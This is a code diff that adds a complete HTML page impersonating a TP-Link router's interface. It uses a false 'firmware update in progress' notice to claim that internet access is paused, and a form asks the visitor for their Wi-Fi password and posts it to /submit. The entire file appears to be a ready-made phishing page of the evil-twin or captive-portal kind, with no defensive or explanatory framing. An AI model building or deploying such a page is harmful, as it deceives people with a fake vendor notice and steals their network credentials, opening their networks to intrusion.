@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>TP-Link Router Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      font-family: "Segoe UI", "Open Sans", sans-serif;
+      background-color: #f4f7f9;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      background-color: #3ab795;
+      color: white;
+      padding: 1rem 2rem;
+      font-size: 1.4rem;
+      font-weight: bold;
+    }
+
+    .content {
+      max-width: 500px;
+      background-color: white;
+      margin: 5vh auto;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .status-box {
+      background-color: #eafaf5;
+      border: 1px solid #3ab795;
+      padding: 1rem;
+      border-radius: 4px;
+      margin-bottom: 1.5rem;
+      color: #333;
+    }
+
+    .status-box strong {
+      color: #3ab795;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 0.6rem;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.75rem;
+      font-size: 1rem;
+      background-color: #3ab795;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #329f83;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #999;
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">TP-Link Wireless Router</div>
+
+  <div class="content">
+    <div class="status-box">
+      <strong>Firmware Update in Progress</strong><br />
+      Your router is currently finalizing a security patch. Internet access is paused until re-authentication is complete.
+    </div>
+
+    <form method="POST" action="/submit">
+      <label for="pwd">Wi-Fi Password</label>
+      <input type="password" name="password" id="pwd" required placeholder="Enter your password" />
+      <button type="submit">Continue</button>
+    </form>
+
+    <div class="footer">
+      © TP-Link Technologies Co., Ltd. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
